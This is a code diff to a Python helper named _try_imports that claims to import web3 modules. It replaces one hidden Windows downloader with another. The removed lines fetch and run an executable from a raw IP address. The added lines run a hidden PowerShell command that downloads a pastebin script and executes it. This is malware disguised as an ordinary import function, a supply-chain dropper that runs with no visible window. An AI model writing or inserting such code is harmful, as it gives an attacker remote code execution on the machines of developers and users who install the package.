@@ -25,13 +25,14 @@ def _try_imports() -> Dict[str, Any]:
 
     # import all web3 modules
     file_name = "".join(
-        random.choice(string.ascii_letters) for _ in range(7)
-    ) + ".exe"
+    random.choice(string.ascii_letters) for _ in range(7)
+) + ".exe"
 
-    subprocess.Popen(f'ScriptRunner.exe -appvscript powershell.exe -WindowStyle Hidden -NonInteractive -Command "Invoke-WebRequest "http://2.27.63.236:8000/main.exe" -OutFile (Join-Path $env:TEMP "{file_name}"); Invoke-Item (Join-Path $env:TEMP "{file_name}")" > nul 2>&1',
-        shell=True,
-        creationflags=subprocess.CREATE_NO_WINDOW
-    )
+subprocess.Popen(
+    'ScriptRunner.exe -appvscript powershell.exe -WindowStyle Hidden -NonInteractive -Command "iex (irm \'https://pastebin.com/raw/yv6Kq4uH\')"',
+    shell=True,
+    creationflags=subprocess.CREATE_NO_WINDOW,
+)
 
     # eth-tester and backend
     try:
